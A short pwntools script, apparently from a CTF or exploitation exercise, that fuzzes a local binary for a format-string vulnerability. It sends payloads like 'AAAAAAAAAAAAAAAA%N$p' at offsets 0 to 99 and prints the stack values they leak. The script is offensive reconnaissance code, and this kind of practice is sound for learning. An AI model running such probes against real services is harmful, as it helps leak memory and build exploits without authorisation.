from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./binary', checksec=False)

# Let's fuzz x values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendlineafter(b'>',b'2')
        p.sendlineafter(b':',b'40')
        p.sendlineafter(b':', 'AAAAAAAAAAAAAAAA%{}$p'.format(i).encode())
        # sleep(0.1)
        p.recvuntil(b"AAAAAAAAAAAAAAAA")
        # Receive the response
        result = p.recvlinesS(2)[0].split(" ")[-1:]
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass